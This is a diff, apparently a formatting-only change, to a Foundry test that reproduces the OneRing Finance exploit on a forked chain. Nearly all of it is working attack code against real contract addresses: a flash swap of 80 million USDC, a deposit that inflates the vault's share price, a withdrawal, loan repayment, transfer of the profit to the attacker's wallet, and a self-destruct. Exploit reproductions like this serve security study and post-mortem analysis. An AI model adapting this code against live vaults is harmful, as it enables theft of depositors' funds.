@@ -3,10 +3,10 @@ pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
 import {TestHarness} from "../../TestHarness.sol";
-import {IUniswapV2Pair} from '../../utils/IUniswapV2Pair.sol';
-import {IERC20} from '../../interfaces/IERC20.sol';
+import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";
+import {IERC20} from "../../interfaces/IERC20.sol";
 
-import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
+import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
 
 // forge test --match-contract Exploit_OneRingFinance -vvv
 /*
@@ -91,24 +91,27 @@ use timeweighted price feeds for token pairs or similar solutions that prevent p
 */
 
 interface IOneRingVault {
-  function depositSafe(uint256 _amount, address _token, uint256 _minAmount) external;
-  function withdraw(uint256 _amount, address _underlying) external;
-  function balanceOf(address account) external view returns (uint256);
-  function getSharePrice() external view returns(uint256);
+    function depositSafe(uint256 _amount, address _token, uint256 _minAmount) external;
+    function withdraw(uint256 _amount, address _underlying) external;
+    function balanceOf(address account) external view returns (uint256);
+    function getSharePrice() external view returns (uint256);
 }
 
-interface ISolidlyPair is IUniswapV2Pair {}  // Essentially the same but for the callback selector.
+interface ISolidlyPair is
+    IUniswapV2Pair // Essentially the same but for the callback selector.
+{}
 
 contract Exploit_OneRingFinance is TestHarness, TokenBalanceTracker {
     ISolidlyPair pairUsdc_Mim = ISolidlyPair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
     IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
     IERC20 mim = IERC20(0x82f0B8B456c1A451378467398982d4834b6829c1);
-    
+
     IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
     uint256 borrowAmount;
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 34041499); // We pin one block before the exploit happened.
+        cheat.createSelectFork(vm.envString("RPC_URL"), 34_041_499); // We pin one block before the exploit
+        // happened.
 
         cheat.deal(address(this), 0);
 
@@ -121,7 +124,7 @@ contract Exploit_OneRingFinance is TestHarness, TokenBalanceTracker {
     }
 
     function test_attack() external {
-        console.log('------- STEP 1: FLASHSWAP -------');  
+        console.log("------- STEP 1: FLASHSWAP -------");
         borrowAmount = 80_000_000 * 1e6; // Borrows 80MM USDC from the pool
 
         pairUsdc_Mim.swap(
@@ -130,54 +133,52 @@ contract Exploit_OneRingFinance is TestHarness, TokenBalanceTracker {
             address(this),
             abi.encode("0xdeadbeef") // trigger the loan by sending arbitrary data
         );
-
-
     }
-    // Essentially the same as uniswapV2Call, the flashswap callback.
-     function hook(address sender, uint , uint , bytes calldata ) external{
-        require(sender == address(this), 'Not requested by this');
-        require(msg.sender == address(pairUsdc_Mim), 'Not requested by pair');
-        
-        console.log('------- STEP 2: INSIDE FLASHSWAP CALLBACK -------');  
-        logBalancesWithLabel('Attacker', address(this));
-        logBalancesWithLabel('Vault', address(vault));
-        console.log('Retrieved price: ', vault.getSharePrice());
-        console.log('\n');
 
-        console.log('------- STEP 3: DEPOSIT USDC -------');  
-        
+    // Essentially the same as uniswapV2Call, the flashswap callback.
+    function hook(address sender, uint256, uint256, bytes calldata) external {
+        require(sender == address(this), "Not requested by this");
+        require(msg.sender == address(pairUsdc_Mim), "Not requested by pair");
+
+        console.log("------- STEP 2: INSIDE FLASHSWAP CALLBACK -------");
+        logBalancesWithLabel("Attacker", address(this));
+        logBalancesWithLabel("Vault", address(vault));
+        console.log("Retrieved price: ", vault.getSharePrice());
+        console.log("\n");
+
+        console.log("------- STEP 3: DEPOSIT USDC -------");
+
         usdc.approve(address(vault), type(uint256).max);
         vault.depositSafe(borrowAmount, address(usdc), 1);
-        
-        logBalancesWithLabel('Attacker', address(this));
-        logBalancesWithLabel('Vault', address(vault));
-        console.log('Retrieved price: ', vault.getSharePrice());
-        console.log('\n');
 
+        logBalancesWithLabel("Attacker", address(this));
+        logBalancesWithLabel("Vault", address(vault));
+        console.log("Retrieved price: ", vault.getSharePrice());
+        console.log("\n");
 
-        console.log('------- STEP 4: WITHDRAW -------');  
-        vault.withdraw(vault.balanceOf(address(this)),address(usdc));
-        
-        logBalancesWithLabel('Attacker', address(this));
-        logBalancesWithLabel('Vault', address(vault));
-        console.log('Retrieved price: ', vault.getSharePrice());
-        console.log('\n');
+        console.log("------- STEP 4: WITHDRAW -------");
+        vault.withdraw(vault.balanceOf(address(this)), address(usdc));
 
-        console.log('------- STEP 5: REPAY LOAN -------');  
-        usdc.transfer(address(pairUsdc_Mim),(borrowAmount/9999*10000)+10000);
+        logBalancesWithLabel("Attacker", address(this));
+        logBalancesWithLabel("Vault", address(vault));
+        console.log("Retrieved price: ", vault.getSharePrice());
+        console.log("\n");
 
-        logBalancesWithLabel('Attacker', address(this));
-        logBalancesWithLabel('Vault', address(vault));
-        console.log('Retrieved price: ', vault.getSharePrice());
-        console.log('\n');
-        
-        console.log('------- STEP 6: SEND FUNDS TO EOA -------');
-        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
-        logBalancesWithLabel('Attacker', address(this));
-        logBalancesWithLabel('Attacker EOA', tx.origin);
-        logBalancesWithLabel('Vault', address(vault));
+        console.log("------- STEP 5: REPAY LOAN -------");
+        usdc.transfer(address(pairUsdc_Mim), (borrowAmount / 9999 * 10_000) + 10_000);
 
-        console.log('------- STEP 7: SELFDESTRUCTS CONTRACT -------');  
+        logBalancesWithLabel("Attacker", address(this));
+        logBalancesWithLabel("Vault", address(vault));
+        console.log("Retrieved price: ", vault.getSharePrice());
+        console.log("\n");
+
+        console.log("------- STEP 6: SEND FUNDS TO EOA -------");
+        usdc.transfer(tx.origin, usdc.balanceOf(address(this)));
+        logBalancesWithLabel("Attacker", address(this));
+        logBalancesWithLabel("Attacker EOA", tx.origin);
+        logBalancesWithLabel("Vault", address(vault));
+
+        console.log("------- STEP 7: SELFDESTRUCTS CONTRACT -------");
         selfdestruct(payable(tx.origin));
     }
 }
